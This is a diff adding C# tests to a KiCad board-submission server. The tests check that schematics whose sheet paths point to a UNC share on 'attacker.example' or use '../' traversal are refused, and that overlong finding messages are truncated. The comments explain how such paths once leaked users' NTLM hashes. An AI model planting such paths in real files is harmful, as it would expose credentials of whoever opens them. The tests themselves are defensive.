@@ -254,6 +254,107 @@ namespace CRT.Server.Tests
             Assert.Contains(result.Findings, finding => finding.Subject.EndsWith("board.kicad_pcb", StringComparison.Ordinal));
         }
 
+        // ###########################################################################################
+        // *** A KiCad SCHEMATIC NAMING A SHEET OUTSIDE ITS "KiCad data" FOLDER IS REFUSED (security
+        // review, 2026-10-11). *** The sheet's path is written inside the file, and CRT followed it:
+        // "//server/share/x.kicad_sch" made every Windows CRT showing the board connect to that server
+        // and hand over the user's NTLM hash. CRT no longer follows such a path, but CRTs already
+        // installed do - so the server refuses the file before any maintainer could approve it.
+        //
+        // So is a sheet naming a file that is no schematic (code review, 2026-10-11): an installed
+        // CRT reads it as one and follows the sheets in it, but the rule looks inside .kicad_sch
+        // files only - a .kicad_pcb carrying a sheet that names a share went round it.
+        // ###########################################################################################
+        [Theory]
+        [InlineData("//attacker.example/share/x.kicad_sch")]
+        [InlineData("\\\\\\\\attacker.example\\\\share\\\\x.kicad_sch")]
+        [InlineData("../../x.kicad_sch")]
+        [InlineData("board.kicad_pcb")]
+        public async Task A_KiCad_sheet_CRT_may_not_follow_is_refused_at_finalise(string sheetFile)
+        {
+            var store = new FakeSubmissionStore();
+            BlobStore blobs = this.Blobs();
+
+            byte[] schematic = Encoding.UTF8.GetBytes(
+                "(kicad_sch (version 20231120) (generator \"eeschema\")\n" +
+                $"  (sheet (at 0 0) (size 10 10) (property \"Sheetname\" \"x\") (property \"Sheetfile\" \"{sheetFile}\"))\n" +
+                ")\n");
+
+            SubmissionManifest manifest = SubmissionFlowTests.Manifest();
+            manifest.Files.Add(new SubmissionFile
+            {
+                Path = "Commodore/C64/250407/KiCad data/root.kicad_sch",
+                Sha256 = Convert.ToHexStringLower(SHA256.HashData(schematic)),
+                SizeBytes = schematic.Length
+            });
+
+            SubmissionCreationOutcome created = await SubmissionFlows.CreateAsync(
+                manifest, SubmissionFlowTests.Contributor(), this.BoardFolder(),
+                store, blobs, SubmissionFlowTests.Now, CancellationToken.None, this.Tree());
+
+            Assert.True(created.IsAccepted);
+
+            await this.UploadAsync(created.Negotiation!, manifest.Files[0], "PNGDATA", store, blobs);
+
+            using (var stream = new MemoryStream(schematic))
+            {
+                await SubmissionFlows.UploadChunkAsync(
+                    created.Negotiation!.SubmissionId, manifest.Files[1].Sha256, 0, stream,
+                    created.Negotiation.UploadToken, store, blobs, SubmissionFlowTests.Now);
+            }
+
+            SubmissionResult result = await SubmissionFlows.FinaliseAsync(
+                created.Negotiation.SubmissionId, created.Negotiation.UploadToken,
+                store, blobs, SubmissionFlowTests.Now);
+
+            Assert.False(result.IsAccepted);
+            Assert.Contains(result.Findings, finding =>
+                finding.Code == "file.content_mismatch" && finding.Subject.EndsWith("root.kicad_sch", StringComparison.Ordinal));
+        }
+
+        // A real project's pages - beside the root sheet or in a sub-folder of "KiCad data" - pass.
+        [Fact]
+        public async Task A_KiCad_sheet_naming_its_pages_inside_its_KiCad_folder_is_accepted_at_finalise()
+        {
+            var store = new FakeSubmissionStore();
+            BlobStore blobs = this.Blobs();
+
+            byte[] schematic = Encoding.UTF8.GetBytes(
+                "(kicad_sch (version 20231120) (generator \"eeschema\")\n" +
+                "  (sheet (at 0 0) (size 10 10) (property \"Sheetname\" \"CPU\") (property \"Sheetfile\" \"Pages/cpu.kicad_sch\"))\n" +
+                "  (sheet (at 0 0) (size 10 10) (property \"Sheetname\" \"VIC\") (property \"Sheetfile\" \"vic.kicad_sch\"))\n" +
+                ")\n");
+
+            SubmissionManifest manifest = SubmissionFlowTests.Manifest();
+            manifest.Files.Add(new SubmissionFile
+            {
+                Path = "Commodore/C64/250407/KiCad data/root.kicad_sch",
+                Sha256 = Convert.ToHexStringLower(SHA256.HashData(schematic)),
+                SizeBytes = schematic.Length
+            });
+
+            SubmissionCreationOutcome created = await SubmissionFlows.CreateAsync(
+                manifest, SubmissionFlowTests.Contributor(), this.BoardFolder(),
+                store, blobs, SubmissionFlowTests.Now, CancellationToken.None, this.Tree());
+
+            Assert.True(created.IsAccepted);
+
+            await this.UploadAsync(created.Negotiation!, manifest.Files[0], "PNGDATA", store, blobs);
+
+            using (var stream = new MemoryStream(schematic))
+            {
+                await SubmissionFlows.UploadChunkAsync(
+                    created.Negotiation!.SubmissionId, manifest.Files[1].Sha256, 0, stream,
+                    created.Negotiation.UploadToken, store, blobs, SubmissionFlowTests.Now);
+            }
+
+            SubmissionResult result = await SubmissionFlows.FinaliseAsync(
+                created.Negotiation.SubmissionId, created.Negotiation.UploadToken,
+                store, blobs, SubmissionFlowTests.Now);
+
+            Assert.True(result.IsAccepted, string.Join("; ", result.Findings.Select(finding => finding.Message)));
+        }
+
         // -----------------------------------------------------------------------------------
         // Create and negotiate.
         // -----------------------------------------------------------------------------------
@@ -1577,8 +1678,33 @@ namespace CRT.Server.Tests
             Assert.Equal(SubmissionFlows.MaximumFindingCodeLength, finding.Code.Length);
             Assert.EndsWith("...", finding.Subject, StringComparison.Ordinal);
 
-            // The message is TEXT - never cut, it is what the contributor reads.
+            // The message is TEXT, and what the contributor reads - not cut while the column holds it.
             Assert.Equal(10_000, finding.Message.Length);
+        }
+
+        // ###########################################################################################
+        // ...but a message the column cannot hold is cut to fit (code review, 2026-10-11): a refusal
+        // quoting a 70,000-character KiCad sheet path whole failed the findings INSERT at finalise,
+        // answering a 500 and leaving the submission "uploading". 16,000 characters take at most
+        // 48,000 bytes of UTF-8 - under TEXT's 65,535.
+        // ###########################################################################################
+        [Fact]
+        public void A_finding_message_too_big_for_its_column_is_cut_to_fit()
+        {
+            ValidationFinding finding = Assert.Single(SubmissionFlows.FitForStorage(
+            [
+                new ValidationFinding
+                {
+                    Severity = ValidationSeverity.Error,
+                    Code = "file.content_mismatch",
+                    Subject = "Commodore/C64/250407/KiCad data/root.kicad_sch",
+                    Message = new string('一', 70_000)
+                }
+            ]));
+
+            Assert.Equal(SubmissionFlows.MaximumFindingMessageLength, finding.Message.Length);
+            Assert.True(Encoding.UTF8.GetByteCount(finding.Message) <= 65_535);
+            Assert.EndsWith("...", finding.Message, StringComparison.Ordinal);
         }
 
         // Uploads a file's content in one go, asserting it completed. Takes the negotiation so it
